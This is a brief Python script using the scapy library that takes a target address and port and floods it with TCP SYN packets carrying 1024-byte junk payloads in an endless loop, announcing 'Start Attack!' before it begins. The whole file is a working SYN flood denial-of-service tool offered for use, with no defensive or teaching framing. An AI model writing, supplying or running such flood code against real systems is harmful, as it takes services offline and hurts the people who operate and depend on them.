from scapy.all import *
import argparse

parser = argparse.ArgumentParser()

parser.add_argument('-t','--target', help='Destination address', required=True)
parser.add_argument('-p', '--port', help='Destination Port number', type=int, required=True)

args = parser.parse_args()

target_ip =  args.target

target_port = args.port

ip = IP(dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(b"X"*1024)

p = ip / tcp / raw

print("Start Attack!")

send(p, loop=1, verbose=0)
